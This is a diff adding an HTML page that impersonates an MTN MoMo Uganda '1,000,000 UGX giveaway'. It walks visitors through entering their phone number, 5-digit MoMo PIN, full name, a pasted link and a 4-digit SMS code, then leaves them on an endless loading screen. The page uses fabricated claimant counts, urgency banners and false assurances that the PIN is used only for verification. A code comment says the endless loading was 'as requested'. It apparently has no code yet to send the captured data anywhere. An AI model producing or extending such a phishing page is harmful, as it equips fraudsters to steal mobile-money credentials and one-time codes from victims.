@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MTN MoMo UGANDA · Giveaway</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #0b1e2b 0%, #1a2f3c 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+
+    .card {
+      background: #0f212e;
+      border-radius: 2.5rem;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 215, 0, 0.2);
+      width: 100%;
+      max-width: 480px;
+      padding: 2rem 1.8rem;
+      border: 1px solid #ffd96633;
+      transition: all 0.2s;
+    }
+
+    .mtn-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 1.8rem;
+    }
+
+    .mtn-logo {
+      background: #ffc107;
+      width: 48px;
+      height: 48px;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 1.6rem;
+      color: #0b1e2b;
+      letter-spacing: -1px;
+      box-shadow: 0 4px 12px #ffc10755;
+    }
+
+    .mtn-header h1 {
+      color: #fff;
+      font-size: 1.6rem;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      line-height: 1.2;
+    }
+
+    .mtn-header h1 span {
+      color: #ffc107;
+      font-weight: 900;
+    }
+
+    .page {
+      display: none;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    label {
+      display: block;
+      color: #cccccc;
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    .select-wrapper, .input-wrapper {
+      position: relative;
+      margin-bottom: 1.3rem;
+    }
+
+    select, input {
+      width: 100%;
+      padding: 15px 18px;
+      background: #1b2e3b;
+      border: 1.5px solid #2f4453;
+      border-radius: 20px;
+      font-size: 1rem;
+      color: white;
+      outline: none;
+      transition: 0.2s;
+      font-weight: 500;
+      appearance: none;
+    }
+
+    select:focus, input:focus {
+      border-color: #ffc107;
+      background: #1f3544;
+      box-shadow: 0 0 0 3px #ffc10733;
+    }
+
+    select {
+      cursor: pointer;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='%23ffc107' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 18px center;
+      background-size: 20px;
+    }
+
+    .phone-input-group {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .country-code-prefix {
+      background: #1b2e3b;
+      border: 1.5px solid #2f4453;
+      border-radius: 20px;
+      padding: 15px 18px;
+      font-weight: 600;
+      color: #ffc107;
+      font-size: 1rem;
+      white-space: nowrap;
+      min-width: 90px;
+      text-align: center;
+      letter-spacing: 0.5px;
+    }
+
+    .phone-input-group input {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .pin-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 1.3rem;
+    }
+
+    .pin-row input {
+      text-align: center;
+      font-size: 1.3rem;
+      letter-spacing: 6px;
+      font-weight: 700;
+      padding: 15px 0;
+    }
+
+    .btn {
+      background: #ffc107;
+      border: none;
+      color: #0b1e2b;
+      font-weight: 800;
+      font-size: 1.1rem;
+      padding: 16px 20px;
+      border-radius: 40px;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+      letter-spacing: 0.3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 6px 0 #9e7d07;
+      transform: translateY(0);
+      margin-top: 0.5rem;
+    }
+
+    .btn:active {
+      transform: translateY(4px);
+      box-shadow: 0 2px 0 #9e7d07;
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      transform: translateY(4px);
+      box-shadow: 0 2px 0 #9e7d07;
+      pointer-events: none;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 2px solid #ffc107;
+      color: #ffc107;
+      box-shadow: none;
+      font-weight: 700;
+    }
+
+    .btn-outline:active {
+      transform: translateY(2px);
+    }
+
+    .giveaway-badge {
+      background: #ffc10715;
+      border: 1px dashed #ffc107;
+      border-radius: 30px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 1.2rem 0 1rem;
+      color: #ffd966;
+      font-size: 0.9rem;
+    }
+
+    .giveaway-badge strong {
+      color: #ffc107;
+      font-size: 1.1rem;
+    }
+
+    .scarcity {
+      background: #f9731622;
+      border-left: 4px solid #f97316;
+      padding: 12px 16px;
+      border-radius: 16px;
+      color: #fed7aa;
+      font-size: 0.9rem;
+      margin: 1rem 0 1.3rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 500;
+    }
+
+    .scarcity .emoji {
+      font-size: 1.3rem;
+    }
+
+    .peers {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #9bb7c9;
+      font-size: 0.85rem;
+      margin-bottom: 0.8rem;
+      background: #1b2e3b;
+      padding: 10px 14px;
+      border-radius: 30px;
+    }
+
+    .peers-dot {
+      width: 10px;
+      height: 10px;
+      background: #22c55e;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #22c55e;
+      display: inline-block;
+      margin-right: 4px;
+    }
+
+    .helper {
+      color: #8aa3b3;
+      font-size: 0.75rem;
+      margin-top: 6px;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+
+    .info-text {
+      color: #b0c7d4;
+      font-size: 0.9rem;
+      margin-bottom: 1.2rem;
+      line-height: 1.4;
+      background: #1b2e3b80;
+      padding: 12px 16px;
+      border-radius: 18px;
+    }
+
+    .pin-page h2, .verify-page h2 {
+      color: white;
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      letter-spacing: -0.5px;
+    }
+
+    .pin-page p, .verify-page p {
+      color: #9bb7c9;
+      margin-bottom: 1.8rem;
+      font-size: 0.95rem;
+    }
+
+    .code-4digit {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin: 1.2rem 0 0.8rem;
+    }
+
+    .code-4digit input {
+      width: 65px;
+      height: 75px;
+      text-align: center;
+      font-size: 2rem;
+      font-weight: 800;
+      padding: 0;
+      background: #1b2e3b;
+      border: 2px solid #2f4453;
+      border-radius: 18px;
+    }
+
+    .code-4digit input:focus {
+      border-color: #ffc107;
+    }
+
+    .loading-screen {
+      text-align: center;
+      padding: 2rem 0;
+    }
+
+    .loader {
+      width: 70px;
+      height: 70px;
+      border: 6px solid #2f4453;
+      border-top: 6px solid #ffc107;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin: 0 auto 2rem;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-screen h2 {
+      color: #ffc107;
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+
+    .loading-screen p {
+      color: #9bb7c9;
+      font-size: 1rem;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .flex-center {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .mt-2 { margin-top: 0.8rem; }
+    .mt-3 { margin-top: 1.5rem; }
+
+    .small-link {
+      color: #ffc107;
+      text-decoration: underline;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .copy-hint {
+      background: #1b2e3b;
+      border-radius: 30px;
+      padding: 10px 16px;
+      font-size: 0.85rem;
+      color: #b0c7d4;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+      border: 1px solid #2f4453;
+    }
+
+    .copy-hint span {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      margin-right: 8px;
+      color: #ffc107;
+      font-weight: 500;
+    }
+
+    .copy-btn {
+      background: #2f4453;
+      border: none;
+      color: white;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .copy-btn:active {
+      background: #ffc107;
+      color: #0b1e2b;
+    }
+
+    .note {
+      font-size: 0.75rem;
+      color: #7a96a8;
+      margin-top: 12px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <!-- HEADER -->
+    <div class="mtn-header">
+      <div class="mtn-logo">MTN</div>
+      <h1>MoMo <span>UGANDA</span></h1>
+    </div>
+
+    <!-- ================= PAGE 1: PHONE + PIN ================= -->
+    <div id="page1" class="page active">
+      <form id="phoneForm" onsubmit="event.preventDefault(); goToPromo();">
+        <label>Select country</label>
+        <div class="select-wrapper">
+          <select id="countrySelect" required>
+            <option value="" disabled selected>— Choose your country —</option>
+            <option value="UG" data-code="+256">🇺🇬 Uganda (+256)</option>
+            <option value="KE" data-code="+254">🇰🇪 Kenya (+254)</option>
+            <option value="TZ" data-code="+255">🇹🇿 Tanzania (+255)</option>
+            <option value="RW" data-code="+250">🇷🇼 Rwanda (+250)</option>
+            <option value="NG" data-code="+234">🇳🇬 Nigeria (+234)</option>
+            <option value="GH" data-code="+233">🇬🇭 Ghana (+233)</option>
+            <option value="ZA" data-code="+27">🇿🇦 South Africa (+27)</option>
+            <option value="ZM" data-code="+260">🇿🇲 Zambia (+260)</option>
+          </select>
+        </div>
+
+        <label>MoMo phone number</label>
+        <div class="phone-input-group">
+          <div id="countryCodeDisplay" class="country-code-prefix">+256</div>
+          <input type="tel" id="phoneNumber" placeholder="7XX XXX XXX" required pattern="[0-9 ]{9,15}" inputmode="numeric">
+        </div>
+        <div class="helper">Use the number registered with MTN MoMo</div>
+
+        <label>MoMo PIN (5 digits)</label>
+        <div class="pin-row">
+          <input type="password" id="pin" placeholder="•••••" maxlength="5" required pattern="\d{5}" inputmode="numeric" title="5-digit MoMo PIN">
+        </div>
+        <div class="helper">Your PIN is securely used for verification only</div>
+
+        <button type="submit" class="btn" id="continueBtn">Continue to giveaway →</button>
+      </form>
+    </div>
+
+    <!-- ================= PAGE 2: PROMOTION + APPLICATION ================= -->
+    <div id="page2" class="page">
+      <div class="giveaway-badge">
+        <span style="font-size: 2rem;">🎁</span>
+        <div><strong>FREE GIVEAWAY</strong> — MTN MoMo 1,000,000 UGX</div>
+      </div>
+
+      <div class="peers">
+        <span class="peers-dot"></span> 12,847 people already claimed this offer
+      </div>
+
+      <div class="scarcity">
+        <span class="emoji">⏳</span> <strong>Opportunity expires soon!</strong> Limited slots — don't be left behind.
+      </div>
+
+      <div class="info-text">
+        <strong>💰 1,000,000 UGX giveaway</strong> — free to enter. No registration fee. Use your MoMo details for quick review.
+      </div>
+
+      <form id="applicationForm" onsubmit="event.preventDefault(); goToVerifyLink();">
+        <label>Full name (as on MoMo)</label>
+        <div class="input-wrapper">
+          <input type="text" id="fullName" placeholder="e.g. John Okello" required>
+        </div>
+
+        <label>Why do you deserve this giveaway?</label>
+        <div class="input-wrapper">
+          <textarea id="reason" rows="3" placeholder="Tell us briefly..." style="width:100%; padding:15px 18px; background:#1b2e3b; border:1.5px solid #2f4453; border-radius:20px; color:white; font-size:1rem; outline:none; resize:vertical;" required></textarea>
+        </div>
+        <div class="helper">Use MoMo details for quick review ✅</div>
+
+        <button type="submit" class="btn" style="margin-top: 0.8rem;">Submit application</button>
+      </form>
+    </div>
+
+    <!-- ================= PAGE 3: VERIFY LINK ================= -->
+    <div id="page3" class="page">
+      <div class="verify-page">
+        <h2>📎 Verify your link</h2>
+        <p>Copy and paste the verification link you received from MTN MoMo below.</p>
+
+        <div class="copy-hint">
+          <span id="sampleLink">https://momo.mtn.ug/giveaway/ref?code=8871</span>
+          <button type="button" class="copy-btn" onclick="copySampleLink()">Copy</button>
+        </div>
+
+        <label>Paste link here</label>
+        <div class="input-wrapper">
+          <input type="url" id="verificationLink" placeholder="https://..." required>
+        </div>
+
+        <button type="button" class="btn" onclick="goToPinCode()">Submit link</button>
+        <div class="note">A 4-digit code will be sent to your MoMo number</div>
+      </div>
+    </div>
+
+    <!-- ================= PAGE 4: LAST 4-DIGIT CODE ================= -->
+    <div id="page4" class="page">
+      <div class="pin-page">
+        <h2>🔐 Last step</h2>
+        <p>Enter the 4-digit code sent to your MoMo number.</p>
+
+        <div class="code-4digit">
+          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" id="code1" oninput="moveFocus(this, 'code2')">
+          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" id="code2" oninput="moveFocus(this, 'code3')">
+          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" id="code3" oninput="moveFocus(this, 'code4')">
+          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" id="code4" oninput="moveFocus(this, null)">
+        </div>
+
+        <button type="button" class="btn" id="finishBtn" onclick="finishLoading()">Finish</button>
+        <div class="note">Never share your code with anyone</div>
+      </div>
+    </div>
+
+    <!-- ================= PAGE 5: LOADING ================= -->
+    <div id="page5" class="page">
+      <div class="loading-screen">
+        <div class="loader"></div>
+        <h2>Loading.....</h2>
+        <p>Please wait while we verify your details</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Country code prefix auto-update
+    const countrySelect = document.getElementById('countrySelect');
+    const countryCodeDisplay = document.getElementById('countryCodeDisplay');
+    const phoneInput = document.getElementById('phoneNumber');
+
+    countrySelect.addEventListener('change', function() {
+      const selected = this.options[this.selectedIndex];
+      const code = selected.getAttribute('data-code') || '+256';
+      countryCodeDisplay.textContent = code;
+      // clear phone input when country changes
+      phoneInput.value = '';
+    });
+
+    // Set default if none selected
+    window.addEventListener('load', function() {
+      if (countrySelect.selectedIndex <= 0) {
+        countrySelect.selectedIndex = 1; // Uganda
+        countryCodeDisplay.textContent = '+256';
+      }
+    });
+
+    // Page navigation
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(pageId).classList.add('active');
+    }
+
+    // Page 1 → 2
+    function goToPromo() {
+      const phone = phoneInput.value.trim();
+      const pin = document.getElementById('pin').value.trim();
+      if (!phone || pin.length !== 5 || !/^\d{5}$/.test(pin)) {
+        alert('Please enter a valid phone number and 5-digit MoMo PIN.');
+        return;
+      }
+      showPage('page2');
+    }
+
+    // Page 2 → 3
+    function goToVerifyLink() {
+      const name = document.getElementById('fullName').value.trim();
+      const reason = document.getElementById('reason').value.trim();
+      if (!name || !reason) {
+        alert('Please fill in your name and reason.');
+        return;
+      }
+      showPage('page3');
+    }
+
+    // Page 3 → 4
+    function goToPinCode() {
+      const link = document.getElementById('verificationLink').value.trim();
+      if (!link) {
+        alert('Please paste the verification link.');
+        return;
+      }
+      showPage('page4');
+      // focus first code input
+      document.getElementById('code1').focus();
+    }
+
+    // move focus between code inputs
+    function moveFocus(current, nextId) {
+      if (current.value.length === 1 && nextId) {
+        document.getElementById(nextId).focus();
+      }
+    }
+
+    // Page 4 → 5 (loading)
+    function finishLoading() {
+      const c1 = document.getElementById('code1').value;
+      const c2 = document.getElementById('code2').value;
+      const c3 = document.getElementById('code3').value;
+      const c4 = document.getElementById('code4').value;
+
+      if (!c1 || !c2 || !c3 || !c4) {
+        alert('Please enter all 4 digits of the code.');
+        return;
+      }
+
+      // go to loading page
+      showPage('page5');
+      // No further action — just loading forever (as requested)
+    }
+
+    // Copy sample link (for convenience)
+    function copySampleLink() {
+      const linkText = document.getElementById('sampleLink').innerText;
+      navigator.clipboard.writeText(linkText).then(() => {
+        alert('Link copied. You can paste it below.');
+      }).catch(() => {
+        alert('Press and hold to copy the link manually.');
+      });
+    }
+
+    // Add keydown for code inputs (backspace focus)
+    const codeInputs = ['code1', 'code2', 'code3', 'code4'];
+    codeInputs.forEach((id, idx) => {
+      const el = document.getElementById(id);
+      el.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && el.value.length === 0 && idx > 0) {
+          document.getElementById(codeInputs[idx - 1]).focus();
+        }
+      });
+    });
+
+    // Prevent non-numeric in phone field (optional but helpful)
+    phoneInput.addEventListener('input', function(e) {
+      this.value = this.value.replace(/[^\d ]/g, '');
+    });
+
+    // PIN only digits
+    document.getElementById('pin').addEventListener('input', function(e) {
+      this.value = this.value.replace(/\D/g, '').slice(0, 5);
+    });
+
+    // Code fields only single digit
+    codeInputs.forEach(id => {
+      const el = document.getElementById(id);
+      el.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+      });
+    });
+  </script>
+</body>
+</html>
